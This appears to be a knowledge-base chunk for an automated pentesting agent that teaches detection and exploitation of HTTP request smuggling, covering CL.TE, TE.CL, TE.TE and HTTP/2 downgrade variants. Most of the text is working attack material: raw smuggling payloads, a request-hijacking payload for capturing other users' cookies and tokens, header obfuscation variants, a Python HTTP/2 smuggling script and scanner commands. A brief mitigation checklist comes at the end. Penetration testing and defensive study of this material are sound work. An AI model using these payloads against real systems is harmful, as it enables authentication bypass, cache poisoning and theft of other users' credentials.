# HTTP Request Smuggling — Agent Chunk 25
> Source: James Kettle's HTTP Desync Attacks research (PortSwigger), APIsec gateway smuggling guidance, HTTP/2 downgrade research, Burp Suite/http2smugl/smuggler.py documentation
> Purpose: Teaches the agent to detect and exploit HTTP request smuggling vulnerabilities across CL.TE, TE.CL, and TE.TE variants, including HTTP/2 downgrade attacks
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
Use this chunk when testing API gateways, reverse proxies, and load balancers for request smuggling vulnerabilities. Smuggling exploits disagreements between front-end and back-end servers on where one request ends and the next begins. Start with detection (timing-based), then confirm with differential responses, then escalate to exploitation. Always test both CL.TE and TE.CL variants.

---

## 1. Core Concepts

### How Request Smuggling Works
```
Front-end (proxy/CDN/WAF) and back-end (origin) disagree on request boundaries.

The disagreement arises from two ways to determine request body length:
1. Content-Length (CL): explicit byte count
2. Transfer-Encoding (TE): chunked encoding with terminator

When both headers are present, servers may prioritize differently:
- Front-end uses CL, back-end uses TE -> CL.TE
- Front-end uses TE, back-end uses CL -> TE.CL
- Both use TE but parse it differently -> TE.TE

The "smuggled" portion of one request is interpreted as the START
of the next request by the back-end server.
```

---

## 2. CL.TE (Content-Length wins at front-end, Transfer-Encoding at back-end)

### Detection
```bash
# Timing-based detection: if back-end uses TE and reads a partial chunk,
# it will wait for the chunk terminator, causing a timeout

# This request should cause a delay if CL.TE vulnerable:
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ' | \
  nc target.com 80

# Front-end reads 4 bytes ("1\r\nZ") and forwards
# Back-end reads chunk "1\r\nZ\r\n" then waits for next chunk "Q..."
# Timeout = CL.TE confirmed
```

### Exploitation Payload
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

```
Explanation:
- Front-end sees CL: 13, reads "0\r\n\r\nSMUGGLED" (13 bytes) and forwards all
- Back-end sees TE: chunked, reads chunk "0\r\n\r\n" = end of chunks
- "SMUGGLED" remains in the back-end buffer
- Next legitimate request from ANY user is prepended with "SMUGGLED"
```

### Practical CL.TE Attack — Request Hijacking
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 130
Transfer-Encoding: chunked

0

GET /api/admin HTTP/1.1
Host: target.com
Authorization: Bearer <attacker_can_modify_or_capture>
Content-Length: 100

x=
```

```
Result:
- Back-end processes "0\r\n\r\n" as end of first request
- "GET /api/admin..." becomes the start of next request
- Next user's request is APPENDED to Content-Length: 100 body
- Attacker captures victim's headers (including cookies/auth tokens)
```

---

## 3. TE.CL (Transfer-Encoding wins at front-end, Content-Length at back-end)

### Detection
```bash
# Timing-based: if back-end uses CL and receives more data than CL specifies,
# the extra data becomes the next request

# This request should cause a delay if TE.CL vulnerable:
printf 'POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX' | \
  nc target.com 80

# Front-end reads chunked: "0\r\n\r\n" = end of chunks, forwards all
# Back-end reads CL: 6 bytes = "0\r\n\r\nX" then "X" leftover
```

### Exploitation Payload
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

8c
GET /api/admin HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

x=
0

```

```
Explanation:
- Front-end sees TE: reads chunk size 0x8c (140 bytes) containing the smuggled request
- Front-end then reads "0\r\n\r\n" = end of chunks
- Back-end sees CL: 4, reads "8c\r\n" (4 bytes) as first request body
- Remaining data "GET /api/admin..." becomes next request
```

---

## 4. TE.TE (Transfer-Encoding obfuscation)

### Obfuscation Techniques
```http
# Both servers use TE, but one fails to parse an obfuscated TE header
# and falls back to CL

# Variant 1: Extra spacing
Transfer-Encoding : chunked

# Variant 2: Mixed case
Transfer-Encoding: Chunked
transfer-encoding: chunked

# Variant 3: Tab instead of space
Transfer-Encoding:	chunked

# Variant 4: Newline injection
Transfer-Encoding: chunked
 

# Variant 5: Duplicate header
Transfer-Encoding: chunked
Transfer-Encoding: identity

# Variant 6: Trailing characters
Transfer-Encoding: chunkedX
Transfer-Encoding: chunked0

# Variant 7: CRLF injection in header value
Transfer-Encoding: chunked\r\nX: ignore

# Variant 8: Line folding (deprecated)
Transfer-Encoding:
 chunked
```

---

## 5. HTTP/2 Downgrade Smuggling

### H2.CL (HTTP/2 front-end, CL-based back-end)
```
HTTP/2 does not use Content-Length for framing (it has its own frame length).
But when the front-end downgrades HTTP/2 to HTTP/1.1 for the back-end,
it may preserve the CL header from the original HTTP/2 request.

Attack: Set CL in HTTP/2 request that differs from actual body length.
Front-end ignores CL (uses HTTP/2 framing), but back-end trusts CL.
```

```python
# Using h2 library for HTTP/2 smuggling
import h2.connection
import h2.config
import socket, ssl

sock = socket.create_connection(('target.com', 443))
ctx = ssl.create_default_context()
ctx.set_alpn_protocols(['h2'])
sock = ctx.wrap_socket(sock, server_hostname='target.com')

config = h2.config.H2Configuration(client_side=True)
conn = h2.connection.H2Connection(config=config)
conn.initiate_connection()

# Send request with mismatched Content-Length
headers = [
    (':method', 'POST'),
    (':path', '/'),
    (':authority', 'target.com'),
    (':scheme', 'https'),
    ('content-length', '0'),  # CL says 0 bytes
    ('content-type', 'application/x-www-form-urlencoded'),
]

conn.send_headers(1, headers)
# But actually send data (smuggled request)
smuggled = b'GET /api/admin HTTP/1.1\r\nHost: target.com\r\n\r\n'
conn.send_data(1, smuggled, end_stream=True)

sock.sendall(conn.data_to_send())
```

### H2.TE (HTTP/2 front-end, TE-based back-end)
```
Some proxies inject Transfer-Encoding: chunked when downgrading.
If the attacker can control part of the body that looks like chunk encoding,
they can smuggle requests.
```

---

## 6. Gateway-Layer Request Smuggling (APIsec Guidance)

### API Gateway Specific Concerns
```
API gateways add complexity:
1. Multiple layers: CDN -> WAF -> API Gateway -> Backend
2. Each layer may parse HTTP differently
3. API gateways often modify requests (add headers, rewrite paths)
4. Authentication happens at gateway; smuggled requests bypass it

Common vulnerable architectures:
- Nginx -> Gunicorn (CL.TE)
- HAProxy -> Apache (TE.CL)
- AWS ALB -> Node.js (various)
- Cloudflare -> custom backend (TE.TE)
- Envoy -> upstream (header injection)
```

### API-Specific Smuggling Impact
```
1. Authentication bypass: Smuggled request skips gateway auth
2. Cache poisoning: Smuggled response cached for other users
3. Request hijacking: Capture other users' API keys/tokens
4. ACL bypass: Access admin APIs from authenticated user's session
5. WAF bypass: Smuggled payload not inspected by WAF
```

---

## 7. Detection & Exploitation Tools

### Burp Suite
```
Extensions:
- HTTP Request Smuggler (by James Kettle)
  - Automated CL.TE, TE.CL, TE.TE detection
  - Timing-based and differential response detection
  - Handles HTTP/2 downgrade smuggling

Usage:
1. Extensions -> HTTP Request Smuggler
2. Right-click target -> "Smuggle probe"
3. Check Results tab for confirmed vulnerabilities
```

### http2smugl
```bash
# HTTP/2 request smuggling detection tool
git clone https://github.com/neex/http2smugl.git
cd http2smugl && go build

# Detect H2.CL smuggling
./http2smugl detect https://target.com

# Attempt H2.TE smuggling
./http2smugl request https://target.com \
  --smuggle-body "GET /api/admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
```

### smuggler.py
```bash
# Python-based request smuggling scanner
git clone https://github.com/defparam/smuggler.git
cd smuggler

# Scan target
python3 smuggler.py -u https://target.com

# Features:
# - Tests 26+ TE obfuscation variants
# - CL.TE and TE.CL detection
# - Configurable timeout for timing-based detection
# - Mutation engine for payload generation
```

### Manual Detection Script
```bash
# CL.TE timing test
timeout 10 bash -c '
  echo -ne "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n1\r\nZ\r\nQ" | \
  openssl s_client -connect target.com:443 -quiet 2>/dev/null'
RESULT=$?
if [ $RESULT -eq 124 ]; then
  echo "[!] Timeout detected - possible CL.TE vulnerability"
else
  echo "[-] No CL.TE timing anomaly"
fi

# TE.CL timing test
timeout 10 bash -c '
  echo -ne "POST / HTTP/1.1\r\nHost: target.com\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nX" | \
  openssl s_client -connect target.com:443 -quiet 2>/dev/null'
RESULT=$?
if [ $RESULT -eq 124 ]; then
  echo "[!] Timeout detected - possible TE.CL vulnerability"
else
  echo "[-] No TE.CL timing anomaly"
fi
```

---

## 8. James Kettle's Key Findings (HTTP Desync Attacks)

```
Original research (2019-2023):
1. Request smuggling affects ~30% of tested infrastructure
2. CDNs and cloud load balancers are common vulnerable components
3. HTTP/2 to HTTP/1.1 downgrade creates new smuggling vectors
4. Browser-powered desync: exploitable via fetch() with specific headers
5. Client-side desync: poisoning browser connection pool

Key technique: "Pause-based desync"
- Send request headers, pause, then send body
- Front-end times out and forwards partial request
- Back-end receives partial request + next user's request concatenated

Research progression:
2019: "HTTP Desync Attacks" - CL.TE, TE.CL discovery at scale
2021: "HTTP/2: The Sequel is Always Worse" - H2 downgrade smuggling
2022: "Browser-Powered Desync Attacks" - Client-side exploitation
2023: "Pause-based Desync" - Timing-based new variant
```

---

## 9. Mitigation Checklist
- Use HTTP/2 end-to-end (avoid downgrade to HTTP/1.1)
- Normalize ambiguous requests at the front-end: reject requests with both CL and TE
- Configure the front-end to reject TE: chunked obfuscation variants
- Use the same HTTP parser at all layers (or ensure they agree on behavior)
- Disable HTTP/1.1 connection reuse between front-end and back-end
- Deploy request smuggling detection (Burp Scanner, smuggler.py) in CI/CD
- Monitor for desync indicators: unexpected 400/405 errors, response queue poisoning
- Implement unique request IDs that persist across proxy layers for correlation
- Keep proxy/load balancer software updated (many smuggling bugs are patched)
